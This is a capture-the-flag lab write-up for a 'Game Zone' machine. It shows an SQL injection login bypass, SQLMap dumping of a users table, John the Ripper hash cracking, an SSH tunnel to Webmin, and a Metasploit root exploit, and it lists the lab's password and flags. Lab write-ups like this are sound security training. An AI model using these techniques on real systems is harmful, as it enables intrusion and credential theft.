# Game Zone

> Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!

<br>

### Process:

1. Deploy the vulnerable machine:
	- name of large cartoon avatar = **agent 47**
2. Obtain access via SQLi
	- input for username: `' or 1=1 -- -`
	- page redirected you're redirected to = **portal.php**
3. Using SQLMap:
	- enter search term in "review search" and save POST request in burp
	- use SQLMap: 
		- `sqlmap -r request -p searchitem --technique=B -dbs`
		- `sqlmap -r request -p searchitem --technique=B -D db --tables`
		- `sqlmap -r request -p searchitem --technique=B -D db -T users --dump`
	- hashes password in users table = **ab5db915fc9cea6c78df88106c65000c57f2b52901ca6c0c6218f04122c3efd14**
	- username associated with hashed password = **agent47**
	- other table in database = **post**
4. Cracking a password with JohnTheRipper:
	- use john to crack the password: `john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256`
	- de-hashed password = **videogamer124**
	- SSH into machine: `ssh agent47@10.10.243.124` -> [enter password]
	- user flag = **649ac17b1480ac13ef1e4fa579dac95c**
5. Exposing services with reverse SSH tunnels:
	- run `ss -tulpn` to see information about socket connections running
	- setup an SSH tunnel on attack machine to access service service blocked by firewall
		- `ssh -L 10000:localhost:10000 agent47@10.10.243.124`
	- go to service via web browser (`localhost:10000`) and login to CMS with agent47 credentials
	- CMS name = **webmin**
	- CMS version = **1.580**
6. Privilege escalation with Metasploit:
	- find Metasploit exploit for CMS version running:
		- `msfconsole` -> `search webmin 1.580` -> `use 0` -> configure module -> `run`
		- need to set `RHOST` to 127.0.0.1 and `SSL` to false
	- stablise shell: `bash -i` -> `python -c 'import pty;pty.spawn("/bin/sh")'`
	- read root flag:
		- `cat /root/root.txt`
		- root flag = **a4b945830144bd71908d12d902adeee**
	
